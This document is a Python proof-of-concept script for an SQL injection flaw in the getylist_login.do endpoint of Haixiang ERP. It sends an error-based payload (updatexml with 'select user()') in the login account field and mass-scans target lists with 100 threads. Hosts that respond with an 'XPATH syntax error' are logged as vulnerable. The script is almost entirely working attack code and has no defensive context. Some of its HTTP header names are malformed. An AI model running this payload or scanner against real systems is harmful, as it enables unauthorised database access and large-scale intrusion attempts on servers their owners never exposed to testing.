import argparse
from multiprocessing.dummy import Pool
import requests

requests.packages.urllib3.disable_warnings()
import sys


def main():
    banner()
    paserse = argparse.ArgumentParser(description="海翔ERP getylist_login.do SQL注入漏洞")
    paserse.add_argument('-u', '--url', help="please input your url")
    paserse.add_argument('-f', '--file', help="please input your file")
    args = paserse.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        with open(args.file, 'r', encoding='utf-8') as fp:
            fo = fp.readlines()
            url_list = []
            for i in fo:
                url_list.append(i.strip().replace('\n', ''))
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")


def banner():
    banner = """


 /$$                           /$$                                                                   /$$$$$$$$ /$$$$$$$  /$$$$$$$ 
| $$                          |__/                                                                  | $$_____/| $$__  $$| $$__  $$
| $$$$$$$   /$$$$$$  /$$   /$$ /$$  /$$$$$$  /$$$$$$$   /$$$$$$  /$$   /$$ /$$   /$$ /$$$$$$$       | $$      | $$  \ $$| $$  \ $$
| $$__  $$ |____  $$|  $$ /$$/| $$ |____  $$| $$__  $$ /$$__  $$| $$  | $$| $$  | $$| $$__  $$      | $$$$$   | $$$$$$$/| $$$$$$$/
| $$  \ $$  /$$$$$$$ \  $$$$/ | $$  /$$$$$$$| $$  \ $$| $$  \ $$| $$  | $$| $$  | $$| $$  \ $$      | $$__/   | $$__  $$| $$____/ 
| $$  | $$ /$$__  $$  >$$  $$ | $$ /$$__  $$| $$  | $$| $$  | $$| $$  | $$| $$  | $$| $$  | $$      | $$      | $$  \ $$| $$      
| $$  | $$|  $$$$$$$ /$$/\  $$| $$|  $$$$$$$| $$  | $$|  $$$$$$$|  $$$$$$$|  $$$$$$/| $$  | $$      | $$$$$$$$| $$  | $$| $$      
|__/  |__/ \_______/|__/  \__/|__/ \_______/|__/  |__/ \____  $$ \____  $$ \______/ |__/  |__/      |________/|__/  |__/|__/      
                                                       /$$  \ $$ /$$  | $$                                                        
                                                      |  $$$$$$/|  $$$$$$/                                                        
                                                       \______/  \______/                                                         





    """
    print(banner)


def poc(target):
    data = {'accountname':"test' and (updatexml(1,concat(0x7e,(select user()),0x7e),1));--);--"}
    headers = {
        'User - Agent': 'Mozilla / 5.0(Macintosh;Intel Mac OS X10_14_3) AppleWebKit / 605.1.15(KHTML, like Gecko) Version / 12.0.3 Safari / 605.1.15',
        'Upgrade - Insecure - Requests': '1',
        'Content - Type': 'application / x - www - form - urlencoded',
        'Content - Length': '188'

    }
    proxies = {
        'http': 'http://127.0.0.1:8080',
        'https': 'http://127.0.0.1:8080'
    }
    url = target + '/getylist_login.do'
    try:
        result = requests.post(url=url, data=data, headers=headers, timeout=5, verify=False, proxies=proxies).text
        if 'XPATH syntax error' in result:
            with open('resulterp.txt', 'a') as fp1:
                fp1.write(f'[+]{target} is veriable' + '\n')
        else:
            print(f'[-]{target} is not veriable')
    except:
        print(f'[*]{target} server error')


if __name__ == '__main__':
    main()